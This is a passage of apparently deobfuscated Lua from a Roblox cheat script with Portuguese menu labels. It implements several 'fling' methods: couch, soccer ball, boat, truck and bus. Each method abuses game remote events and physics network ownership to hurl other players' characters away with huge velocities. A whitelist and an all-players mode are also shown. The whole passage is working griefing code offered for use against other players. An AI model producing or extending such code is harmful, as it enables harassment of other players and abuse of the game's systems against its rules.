          humanoidRootPart8.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

          task.wait(0.2)

          humanoidRootPart8.Velocity = Vector3.zero
          humanoidRootPart8.RotVelocity = Vector3.zero
          humanoidRootPart8.Anchored = false

          if humanoid7 then
            humanoid7:ChangeState(Enum.HumanoidStateType.GettingUp)
          end
        end)
      end
    end
  end

  function f17(p12)
    if not p12 or not p12.Character or not localPlayer2.Character then
      return
    end

    local character5 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid8 = character5:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart9 = character5:FindFirstChild("HumanoidRootPart")

    if not humanoid8 or not humanoidRootPart9 then
      return
    end

    position2 = humanoidRootPart9.Position

    if not f20() then
      return
    end

    task.wait(0.5)
    couch = character5:FindFirstChild("Couch")

    if not couch then
      for index14, value20 in ipairs(workspaceService:GetDescendants()) do
        if (value20.Name == "Couch" or value20.Name == "Couch" .. localPlayer2.Name)
          and (value20:IsA("BasePart") or value20:IsA("Tool")) then
          couch = value20
          break
        end
      end
    end

    if not couch then
      return
    end

    if couch:IsA("BasePart") then
      v6 = {
        Anchored = couch.Anchored,
        CanCollide = couch.CanCollide,
        CanTouch = couch.CanTouch,
      }

      couch.Anchored = false
      couch.CanCollide = true
      couch.CanTouch = true

      pcall(function() couch:SetNetworkOwner(nil) end)
    end

    v5 = true

    connect = runService.Stepped:Connect(function()
      if not v5 then
        return
      end

      for index15, value21 in ipairs(character5:GetDescendants()) do
        if value21:IsA("BasePart") then
          value21.CanCollide = false
        end
      end
    end)

    local v55 = tick()
    local bodyVelocity = nil

    connect2 = runService.Heartbeat:Connect(function()
      if not v5 then
        return
      end

      local humanoidRootPart10, v56, connect5

      if not p12 or not p12.Character then
        v5 = false
        return
      else
        humanoidRootPart10 = p12.Character:FindFirstChild("HumanoidRootPart")
        local humanoid9 = p12.Character:FindFirstChild("Humanoid")

        if not humanoidRootPart10 or not humanoid9 then
          v5 = false
          return
        end

        if not humanoidRootPart9 or not humanoid8 then
          v5 = false
          return
        end

        pcall(function()
          character5:SetPrimaryPartCFrame(CFrame.new(humanoidRootPart10.Position) * CFrame.Angles(
            math.rad(workspaceService.DistributedGameTime * 12000),
            math.rad(workspaceService.DistributedGameTime * 15000),
            math.rad(workspaceService.DistributedGameTime * 18000)
          ))
        end)

        if humanoid9.Sit or tick() - v55 > 10 then
          v5 = false

          connect2:Disconnect()
          connect2 = nil

          for index16, value22 in ipairs(character5:GetDescendants()) do
            local v57 = value22

            if v57:IsA("BasePart") then
              v57.CanCollide = false
              pcall(function() v57:SetNetworkOwner(nil) end)
            end
          end

          bodyVelocity = Instance.new("BodyVelocity")
          bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

          bodyVelocity.Velocity = Vector3.new(math.random(-5, 5), 5, math.random(-5, 5)).Unit
              * 1000000
            + Vector3.new(0, 1000000, 0)

          bodyVelocity.Parent = humanoidRootPart9

          pcall(function()
            humanoidRootPart9.Anchored = true
            humanoidRootPart9.CFrame = CFrame.new(Vector3.new(-59599.73, 2040070.5, -293391.16))
            humanoidRootPart9.Anchored = false
          end)

          v56 = tick()

          connect5 = nil

          connect5 = runService.Heartbeat:Connect(function()
            if tick() - v56 >= 0.5 then
              connect5:Disconnect()
              return
            end

            pcall(function()
              character5:SetPrimaryPartCFrame(humanoidRootPart9.CFrame * CFrame.Angles(
                math.rad(workspaceService.DistributedGameTime * 12000),
                math.rad(workspaceService.DistributedGameTime * 15000),
                math.rad(workspaceService.DistributedGameTime * 18000)
              ))
            end)
          end)

          task.wait(0.5)

          pcall(function()
            humanoidRootPart9.Anchored = true
            humanoidRootPart9.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

            task.wait(0.2)

            humanoidRootPart9.Velocity = Vector3.zero
            humanoidRootPart9.RotVelocity = Vector3.zero
            humanoidRootPart9.Anchored = false

            if humanoid8 then
              humanoid8:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
          end)

          if bodyVelocity then
            bodyVelocity:Destroy()

            for index17, value23 in ipairs(character5:GetDescendants()) do
              if value23:IsA("BasePart") then
                value23.CanCollide = true
              end
            end
          end

          if ativarFlingAddToggle then
            ativarFlingAddToggle:SetValue(false)
          end
        end

        return
      end
    end)
  end

  function f10(p13)
    if not p13 or not p13.Character or not localPlayer2.Character then
      return
    end

    local character6 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid10 = character6:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart11 = character6:FindFirstChild("HumanoidRootPart")
    local v58, findFirstChild6, v59, bodyVelocity2

    if not humanoid10 or not humanoidRootPart11 then
      return
    else
      position2 = humanoidRootPart11.Position
      task.wait(0.5)
      f6()
      v58 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v58))
      end)

      v58 = { "PickingCar", "SchoolBus" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v58))
      end)

      task.wait(1)
      local vehicles2 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles2 then
        return
      end

      findFirstChild6 = vehicles2:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild6 then
        return
      else
        pcall(function()
          humanoidRootPart11.Anchored = true
          humanoidRootPart11.CFrame = CFrame.new(Vector3.new(1171.15, 79.45, -1166.2))

          task.wait(0.2)

          humanoidRootPart11.Velocity = Vector3.zero
          humanoidRootPart11.RotVelocity = Vector3.zero
          humanoidRootPart11.Anchored = false

          humanoid10:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v60 = tick()

        while true do
          task.wait()

          if tick() - v60 > 10 then
            break
          end

          if humanoid10.Sit then
            for index18, value24 in ipairs(findFirstChild6:GetDescendants()) do
              local v61 = value24

              if v61:IsA("BasePart") then
                v61.CanCollide = false
                pcall(function() v61:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index19, value25 in ipairs(character6:GetDescendants()) do
                if value25:IsA("BasePart") then
                  value25.CanCollide = false
                end
              end
            end)

            v59 = tick()
            bodyVelocity2 = nil

            connect2 = runService.Heartbeat:Connect(function()
              if not v5 then
                return
              end

              local humanoidRootPart12, vector2, v62

              if not p13 or not p13.Character then
                v5 = false
                return
              else
                humanoidRootPart12 = p13.Character:FindFirstChild("HumanoidRootPart")
                local humanoid11 = p13.Character:FindFirstChild("Humanoid")

                if not humanoidRootPart12 or not humanoid11 then
                  v5 = false
                  return
                end

                if not humanoidRootPart11 or not humanoid10 then
                  v5 = false
                  return
                else
                  vector2 = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                  pcall(function()
                    findFirstChild6:PivotTo(CFrame.new(humanoidRootPart12.Position + vector2) * CFrame.Angles(
                      math.rad(workspaceService.DistributedGameTime * 12000),
                      math.rad(workspaceService.DistributedGameTime * 15000),
                      math.rad(workspaceService.DistributedGameTime * 18000)
                    ))
                  end)

                  local v63 = false

                  for index20, value26 in ipairs(findFirstChild6:GetDescendants()) do
                    if (value26:IsA("Seat") or value26:IsA("VehicleSeat"))
                      and value26.Name ~= "VehicleSeat" then
                      if value26.Occupant == humanoid11 then
                        v63 = true
                        break
                      end
                    end
                  end

                  if v63 or tick() - v59 > 10 then
                    v5 = false

                    connect2:Disconnect()
                    connect2 = nil

                    bodyVelocity2 = Instance.new("BodyVelocity")
                    bodyVelocity2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    bodyVelocity2.Velocity = Vector3.new(
                      math.random(-5, 5), 5, math.random(-5, 5)
                    ).Unit * 1000000 + Vector3.new(0, 1000000, 0)

                    bodyVelocity2.Parent = humanoidRootPart11

                    task.wait(0.5)
                    f6()
                    v62 = { "DeleteAllVehicles" }

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v62))
                    end)

                    if bodyVelocity2 then
                      bodyVelocity2:Destroy()

                      for index21, value27 in ipairs(character6:GetDescendants()) do
                        if value27:IsA("BasePart") then
                          value27.CanCollide = true
                        end
                      end
                    end

                    pcall(function()
                      humanoidRootPart11.Anchored = true
                      humanoidRootPart11.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                      task.wait(0.2)

                      humanoidRootPart11.Velocity = Vector3.zero
                      humanoidRootPart11.RotVelocity = Vector3.zero
                      humanoidRootPart11.Anchored = false

                      if humanoid10 then
                        humanoid10:ChangeState(Enum.HumanoidStateType.GettingUp)
                      end
                    end)

                    if ativarFlingAddToggle then
                      ativarFlingAddToggle:Set(false)
                    end
                  end

                  return
                end
              end
            end)

            return
          end
        end

        return
      end
    end
  end

  function f11(p14)
    local v64 = not p14
    local v65, v66

    if v64 or not p14.Character then
      return
    else
      local character7 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
      local humanoid12 = character7:FindFirstChildOfClass("Humanoid")
      local v67 = not humanoid12
      local humanoidRootPart13 = character7:FindFirstChild("HumanoidRootPart")

      if v67 or not humanoidRootPart13 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v65 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v65))
        end)

        local workspaceCom = workspaceService:FindFirstChild("WorkspaceCom")

        if not workspaceCom then
          return
        else
          local findFirstChild7 = workspaceCom:FindFirstChild("001_SoccerBalls")

          if not findFirstChild7 then
            return
          end

          findFirstChild2 = findFirstChild7:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          end

          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          position2 = humanoidRootPart13.Position

          for index22, value28 in ipairs(character7:GetDescendants()) do
            if value28:IsA("BasePart") then
              value28.CanCollide = false
            end
          end

          if humanoid12 then
            humanoid12:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            humanoid12.Sit = false
          end

          for index23, value29 in ipairs(workspaceService:GetDescendants()) do
            if value29:IsA("Seat") or value29:IsA("VehicleSeat") then
              value29.Disabled = true
            end
          end

          pcall(function()
            replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
              "CharacterSizeDown", 4
            )
          end)

          v5 = true
          v66 = 0

          connect = runService.Heartbeat:Connect(function()
            if not v5 or not p14.Character then
              return
            else
              local humanoidRootPart14 = p14.Character:FindFirstChild("HumanoidRootPart")
              local humanoid13 = p14.Character:FindFirstChild("Humanoid")
              local character8 = localPlayer2.Character
              local v68 = not humanoidRootPart14
              local humanoidRootPart15 = character8:FindFirstChild("HumanoidRootPart")

              if v68 or not humanoid13 or not humanoidRootPart15 then
                return
              else
                local moveDirection = humanoid13.MoveDirection
                local v69 = moveDirection.Magnitude < 0.1

                if humanoid13.Sit then
                  local v70 = tick()
                  local v71 = math.sin(v70 * 50)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + Vector3.new(0, 0.75 + v71 * 2, 0))
                elseif v69 then
                  local v72 = tick()
                  local v73 = math.sin(v72 * 50)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + Vector3.new(0, 0.75, v73 * 3))
                else
                  local v74 = math.clamp(humanoidRootPart14.Velocity.Magnitude * 0.15, 5, 12)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + moveDirection.Unit * v74 + Vector3.new(0, 0.75, 0))
                end

                humanoidRootPart15.CFrame = CFrame.new(findFirstChild2.Position
                  + Vector3.new(0, 1, 0))

                return
              end
            end
          end)

          connect2 = runService.Heartbeat:Connect(function()
            local v75 = not v5
            local bodyVelocity3

            if v75 or not p14.Character then
              return
            else
              local humanoidRootPart16 = p14.Character:FindFirstChild("HumanoidRootPart")

              if not humanoidRootPart16 then
                return
              end

              if (findFirstChild2.Position - humanoidRootPart16.Position).Magnitude < 4
                and tick() - v66 > 0.4 then
                v66 = tick()

                for index24, value30 in ipairs(p14.Character:GetDescendants()) do
                  if value30:IsA("BasePart") then
                    value30.CanCollide = false
                  end
                end

                bodyVelocity3 = Instance.new("BodyVelocity")
                bodyVelocity3.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                bodyVelocity3.Velocity = Vector3.new(
                  math.random(-5, 5), 5, math.random(-5, 5)
                ).Unit * 500000 + Vector3.new(0, 250000, 0)

                bodyVelocity3.Parent = humanoidRootPart16

                task.delay(0.3, function()
                  bodyVelocity3:Destroy()

                  for index25, value31 in ipairs(p14.Character:GetDescendants()) do
                    if value31:IsA("BasePart") then
                      value31.CanCollide = true
                    end
                  end
                end)
              end

              return
            end
          end)

          return
        end
      end
    end
  end

  function f22()
    local backpack2 = localPlayer2:WaitForChild("Backpack")

    local soccerBall = backpack2:FindFirstChild("SoccerBall")
      or localPlayer2.Character:FindFirstChild("SoccerBall")

    local v76, v77

    if not soccerBall then
      v77 = { "PickingTools", "SoccerBall" }

      if not pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(v77))
      end) then
        return false
      end

      repeat
        soccerBall = backpack2:FindFirstChild("SoccerBall")
        task.wait()

        v76 = soccerBall
        v76 = soccerBall or task.wait(5)
      until v76

      if not soccerBall then
        return false
      end

      if soccerBall.Parent ~= localPlayer2.Character then
        soccerBall.Parent = localPlayer2.Character
      end

      return true
    end

    if soccerBall.Parent ~= localPlayer2.Character then
      soccerBall.Parent = localPlayer2.Character
    end

    return true
  end

  function f12(p15)
    local v78 = not p15
    local v79, v80

    if v78 or not p15.Character then
      return
    else
      local humanoidRootPart17 = (localPlayer2.Character
        or localPlayer2.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")

      if not humanoidRootPart17 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v79 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v79))
        end)

        local workspaceCom2 = workspaceService:FindFirstChild("WorkspaceCom")

        if not workspaceCom2 then
          return
        else
          local findFirstChild8 = workspaceCom2:FindFirstChild("001_SoccerBalls")

          if not findFirstChild8 then
            return
          end

          findFirstChild2 = findFirstChild8:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          end

          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          position2 = humanoidRootPart17.Position
          v5 = true
          v80 = 0

          connect = runService.Heartbeat:Connect(function()
            local v81 = not v5
            local humanoidRootPart18, vector3

            if v81 or not p15.Character then
              return
            else
              humanoidRootPart18 = p15.Character:FindFirstChild("HumanoidRootPart")
              local humanoid14 = p15.Character:FindFirstChild("Humanoid")

              if not humanoidRootPart18 or not humanoid14 then
                return
              else
                local magnitude = humanoidRootPart18.Velocity.Magnitude
                local v82 = humanoid14.MoveDirection.Magnitude > 0.05
                local v83 = humanoid14:GetState() == Enum.HumanoidStateType.Jumping
                vector3 = nil

                if v82 or v83 then
                  local v84 = math.clamp(magnitude / 1.5, 6, 15)
                  vector3 = humanoidRootPart18.CFrame.LookVector * v84 + Vector3.new(0, 1, 0)
                else
                  local v85 = tick()
                  local v86 = math.sin(v85 * 25)
                  local v87 = tick()
                  local v88 = math.cos(v87 * 20)
                  vector3 = Vector3.new(v88 * 1.5, 1, v86 * 4)
                end

                pcall(function()
                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart18.Position + vector3)
                  findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)
                end)

                return
              end
            end
          end)

          connect2 = runService.Heartbeat:Connect(function()
            local v89 = not v5
            local bodyVelocity4

            if v89 or not p15.Character then
              return
            else
              local humanoidRootPart19 = p15.Character:FindFirstChild("HumanoidRootPart")

              if not humanoidRootPart19 then
                return
              end

              if (findFirstChild2.Position - humanoidRootPart19.Position).Magnitude < 4
                and tick() - v80 > 0.4 then
                v80 = tick()

                for index26, value32 in ipairs(p15.Character:GetDescendants()) do
                  if value32:IsA("BasePart") then
                    value32.CanCollide = false
                  end
                end

                bodyVelocity4 = Instance.new("BodyVelocity")
                bodyVelocity4.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                bodyVelocity4.Velocity = Vector3.new(
                  math.random(-5, 5), 5, math.random(-5, 5)
                ).Unit * 500000 + Vector3.new(0, 250000, 0)

                bodyVelocity4.Parent = humanoidRootPart19

                task.delay(0.3, function()
                  bodyVelocity4:Destroy()

                  for index27, value33 in ipairs(p15.Character:GetDescendants()) do
                    if value33:IsA("BasePart") then
                      value33.CanCollide = true
                    end
                  end
                end)
              end

              return
            end
          end)

          return
        end
      end
    end
  end

  function f13(p16)
    if not p16 or not p16.Character or not localPlayer2.Character then
      return
    end

    local character9 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid15 = character9:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart20 = character9:FindFirstChild("HumanoidRootPart")
    local findFirstChild9, v90

    if not humanoid15 or not humanoidRootPart20 then
      return
    else
      position2 = humanoidRootPart20.Position
      f6()

      task.wait(0.4)
      task.wait(1.5)

      local vehicles3 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles3 then
        return
      end

      findFirstChild9 = vehicles3:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild9 then
        return
      else
        pcall(function()
          humanoidRootPart20.Anchored = true
          humanoidRootPart20.CFrame = CFrame.new(Vector3.new(-3358.85, 5.25, -521.95))

          task.wait(0.2)

          humanoidRootPart20.Velocity = Vector3.zero
          humanoidRootPart20.RotVelocity = Vector3.zero
          humanoidRootPart20.Anchored = false

          humanoid15:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v91 = tick()

        while true do
          task.wait()

          if tick() - v91 > 10 then
            break
          end

          if humanoid15.Sit then
            for index28, value34 in ipairs(findFirstChild9:GetDescendants()) do
              local v92 = value34

              if v92:IsA("BasePart") then
                v92.CanCollide = false
                pcall(function() v92:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index29, value35 in ipairs(character9:GetDescendants()) do
                if value35:IsA("BasePart") then
                  value35.CanCollide = false
                end
              end
            end)

            v90 = tick()

            connect2 = runService.Heartbeat:Connect(function()
              if not v5 then
                return
              end

              local humanoidRootPart21, vector4, humanoidRootPart22

              if not p16 or not p16.Character then
                v5 = false
                return
              else
                humanoidRootPart21 = p16.Character:FindFirstChild("HumanoidRootPart")
                local humanoid16 = p16.Character:FindFirstChild("Humanoid")

                if not humanoidRootPart21 or not humanoid16 then
                  v5 = false
                  return
                end

                if not humanoidRootPart20 or not humanoid15 then
                  v5 = false
                  return
                else
                  vector4 = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                  pcall(function()
                    findFirstChild9:PivotTo(CFrame.new(humanoidRootPart21.Position + vector4) * CFrame.Angles(
                      math.rad(workspaceService.DistributedGameTime * 12000),
                      math.rad(workspaceService.DistributedGameTime * 15000),
                      math.rad(workspaceService.DistributedGameTime * 18000)
                    ))
                  end)

                  local v93 = false

                  for index30, value36 in ipairs(findFirstChild9:GetDescendants()) do
                    if (value36:IsA("Seat") or value36:IsA("VehicleSeat"))
                      and value36.Name ~= "VehicleSeat" then
                      if value36.Occupant == humanoid16 then
                        v93 = true
                        break
                      end
                    end
                  end

                  if v93 or tick() - v90 > 10 then
                    v5 = false

                    if connect then
                      connect:Disconnect()
                      connect = nil
                    end

                    if connect2 then
                      connect2:Disconnect()
                      connect2 = nil
                    end

                    pcall(function()
                      findFirstChild9:PivotTo(CFrame.new(Vector3.new(-76.6, -401.97, -84.26)))
                    end)

                    task.wait(0.5)
                    f6()

                    if character9 then
                      humanoidRootPart22 = character9:FindFirstChild("HumanoidRootPart")

                      if humanoidRootPart22 and position2 then
                        pcall(function()
                          humanoidRootPart22.Anchored = true
                          humanoidRootPart22.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                          task.wait(0.2)

                          humanoidRootPart22.Velocity = Vector3.zero
                          humanoidRootPart22.RotVelocity = Vector3.zero
                          humanoidRootPart22.Anchored = false

                          if humanoid15 then
                            humanoid15:ChangeState(Enum.HumanoidStateType.GettingUp)
                          end
                        end)
                      end
                    end

                    if character9 then
                      for index31, value37 in ipairs(character9:GetDescendants()) do
                        if value37:IsA("BasePart") then
                          value37.CanCollide = true
                          value37.Velocity = Vector3.zero
                          value37.RotVelocity = Vector3.zero
                        end
                      end
                    end

                    local humanoid17 = character9 and character9:FindFirstChild("Humanoid")

                    if humanoid17 then
                      humanoid17:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    end

                    for index32, value38 in ipairs(workspaceService:GetDescendants()) do
                      if value38:IsA("Seat") or value38:IsA("VehicleSeat") then
                        value38.Disabled = false
                      end
                    end

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                        "CharacterSizeUp", 1
                      )
                    end)

                    if ativarFlingAddToggle then
                      ativarFlingAddToggle:Set(false)
                    end
                  end

                  return
                end
              end
            end)

            return
          end
        end

        return
      end
    end
  end

  function f14(p17)
    if not p17 or not p17.Character or not localPlayer2.Character then
      return
    end

    local character10 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid18 = character10:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart23 = character10:FindFirstChild("HumanoidRootPart")
    local findFirstChild10, v94, v95

    if not humanoid18 or not humanoidRootPart23 then
      return
    else
      position2 = humanoidRootPart23.Position

      pcall(function()
        humanoidRootPart23.Anchored = true
        humanoidRootPart23.CFrame = CFrame.new(Vector3.new(1181.83, 76.08, -1158.83))

        task.wait(0.2)

        humanoidRootPart23.Velocity = Vector3.zero
        humanoidRootPart23.RotVelocity = Vector3.zero
        humanoidRootPart23.Anchored = false

        if humanoid18 then
          humanoid18:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
      end)

      task.wait(0.5)
      f6()
      task.wait(1)
      local vehicles4 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles4 then
        return
      end

      findFirstChild10 = vehicles4:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild10 then
        return
      else
        pcall(function()
          humanoidRootPart23.Anchored = true
          humanoidRootPart23.CFrame = CFrame.new(Vector3.new(1176.56, 79.9, -1166.65))

          task.wait(0.2)

          humanoidRootPart23.Velocity = Vector3.zero
          humanoidRootPart23.RotVelocity = Vector3.zero
          humanoidRootPart23.Anchored = false

          humanoid18:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v96 = tick()

        while true do
          task.wait()

          if tick() - v96 > 10 then
            break
          end

          if humanoid18.Sit then
            for index33, value39 in ipairs(findFirstChild10:GetDescendants()) do
              local v97 = value39

              if v97:IsA("BasePart") then
                v97.CanCollide = false
                pcall(function() v97:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index34, value40 in ipairs(character10:GetDescendants()) do
                if value40:IsA("BasePart") then
                  value40.CanCollide = false
                end
              end
            end)

            v94 = tick()
            v95 = 0

            connect2 = runService.Heartbeat:Connect(function()
              if not v5 then
                return
              end

              local humanoidRootPart24, trailer, v98, bodyVelocity5, v99, humanoidRootPart25

              if not p17 or not p17.Character then
                v5 = false
                return
              else
                humanoidRootPart24 = p17.Character:FindFirstChild("HumanoidRootPart")
                local humanoid19 = p17.Character:FindFirstChild("Humanoid")

                if not humanoidRootPart24 or not humanoid19 then
                  v5 = false
                  return
                end

                if not humanoidRootPart23 or not humanoid18 then
                  v5 = false
                  return
                end

                trailer = findFirstChild10:FindFirstChild("Body")
                  and findFirstChild10.Body:FindFirstChild("Trailer")

                if not trailer then
                  return
                else
                  v98 = math.sin(tick() * 30) * 5

                  pcall(function()
                    local vector5 = Vector3.new(0, v98, 0)
                    trailer:PivotTo(CFrame.new(humanoidRootPart24.Position + vector5))
                  end)

                  if (trailer.Position - humanoidRootPart24.Position).Magnitude < 5
                    and tick() - v95 > 0.4 then
                    v95 = tick()

                    for index35, value41 in ipairs(p17.Character:GetDescendants()) do
                      if value41:IsA("BasePart") then
                        value41.CanCollide = false
                      end
                    end

                    bodyVelocity5 = Instance.new("BodyVelocity")
                    bodyVelocity5.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    bodyVelocity5.Velocity = Vector3.new(
                      math.random(-10, 10), 50, math.random(-10, 10)
                    ).Unit * 10000000 + Vector3.new(0, 5000000, 0)

                    bodyVelocity5.Parent = humanoidRootPart24

                    task.delay(0.5, function()
                      bodyVelocity5:Destroy()

                      for index36, value42 in ipairs(p17.Character:GetDescendants()) do
                        if value42:IsA("BasePart") then
                          value42.CanCollide = true
                        end
                      end
                    end)
                  end

                  local v100 = false

                  for index37, value43 in ipairs(findFirstChild10:GetDescendants()) do
                    if (value43:IsA("Seat") or value43:IsA("VehicleSeat"))
                      and value43.Name ~= "VehicleSeat" then
                      if value43.Occupant == humanoid19 then
                        v100 = true
                        break
                      end
                    end
                  end

                  if v100 or tick() - v94 > 10 then
                    v5 = false

                    if connect then
                      connect:Disconnect()
                      connect = nil
                    end

                    if connect2 then
                      connect2:Disconnect()
                      connect2 = nil
                    end

                    pcall(function()
                      findFirstChild10:PivotTo(CFrame.new(Vector3.new(
                        -59599.73, 2040070.5, -293391.16
                      )))
                    end)

                    task.wait(0.5)
                    f6()
                    v99 = { "DeleteAllVehicles" }

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v99))
                    end)

                    if character10 then
                      humanoidRootPart25 = character10:FindFirstChild("HumanoidRootPart")

                      if humanoidRootPart25 and position2 then
                        pcall(function()
                          humanoidRootPart25.Anchored = true
                          humanoidRootPart25.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                          task.wait(0.2)

                          humanoidRootPart25.Velocity = Vector3.zero
                          humanoidRootPart25.RotVelocity = Vector3.zero
                          humanoidRootPart25.Anchored = false

                          if humanoid18 then
                            humanoid18:ChangeState(Enum.HumanoidStateType.GettingUp)
                          end
                        end)
                      end
                    end

                    if character10 then
                      for index38, value44 in ipairs(character10:GetDescendants()) do
                        if value44:IsA("BasePart") then
                          value44.CanCollide = true
                          value44.Velocity = Vector3.zero
                          value44.RotVelocity = Vector3.zero
                        end
                      end
                    end

                    local humanoid20 = character10 and character10:FindFirstChild("Humanoid")

                    if humanoid20 then
                      humanoid20:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    end

                    for index39, value45 in ipairs(workspaceService:GetDescendants()) do
                      if value45:IsA("Seat") or value45:IsA("VehicleSeat") then
                        value45.Disabled = false
                      end
                    end

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                        "CharacterSizeUp", 1
                      )
                    end)

                    if ativarFlingAddToggle then
                      ativarFlingAddToggle:Set(false)
                    end
                  end

                  return
                end
              end
            end)

            return
          end
        end

        return
      end
    end
  end

  ativarFlingAddToggle = tab3:AddToggle({
    Name = "Ativar Fling",
    Description = "Ativa ou desativa o fling com o método selecionado",
    Default = false,
    Callback = function(value46)
      if value46 then
        if v3 or v4 or v5 then
          ativarFlingAddToggle:Set(false)
          return
        end

        if v8 == "Sofá" then
          f17(findFirstChild)
        elseif v8 == "Bola" then
          f11(findFirstChild)
        elseif v8 == "Bola V2" then
          f12(findFirstChild)
        elseif v8 == "Barco" then
          f13(findFirstChild)
        elseif v8 == "Caminhão" then
          f14(findFirstChild)
        elseif v8 == "Ônibus" then
          f10(findFirstChild)
        end

        return
      end

      f9()
    end,
  })

  tab3:AddSection({ " fling ALL e desligue os RGB antes de usar" })
  orbitando = false
  orbitConn = nil
  allFling = false

  function f15(p18)
    local lower = p18:lower()

    for index40, value47 in ipairs(players:GetPlayers()) do
      if value47.Name:lower():find(lower) then
        return value47
      end
    end

    return nil
  end

  allConn = nil
  currentPlayerList = nil
  currentPlayerIndex = nil
  lastSwitchTime = nil
  allFling2 = false
  allConn2 = nil
  findFirstChild2 = nil
  v6 = nil
  excludedPlayers = {}

  tab3:AddTextBox({
    Name = "adicionar jogador na whaitelist",
    Description = "Digite parte do nome do jogador",
    PlaceholderText = "Ex.: rt para (player123)",
    Callback = function(value48)
      if value48 == "" then
        return
      else
        local v101 = f15(value48)

        if v101 then
          for index41, value49 in ipairs(excludedPlayers) do
            if value49 == v101 then
              f7(
                "Jogador Já esta na whaitelist",
                "Jogador " .. v101.Name .. " já foi adicionado.", f8(v101.UserId)
              )

              return
            end
          end

          table.insert(excludedPlayers, v101)
          local v102 = f8(v101.UserId)
          f7("Jogador adicionado", "Jogador " .. v101.Name .. " foi removido dos flings.", v102)
          return
        end

        f7("Jogador Não Encontrado", "Nenhum jogador encontrado com '" .. value48 .. "'.", nil)
        return
      end
    end,
  })

  tab3:AddButton({
    "Verificar Excluídos",
    function()
      if #excludedPlayers == 0 then
        return
      end

      for index42, value50 in ipairs(excludedPlayers) do
        local v103 = f8(value50.UserId)

        f7(
          "Jogador adicionado " .. index42,
          "Jogador " .. value50.Name .. " está removido dos flings.", v103
        )

        task.wait(0.5)
      end
    end,
  })

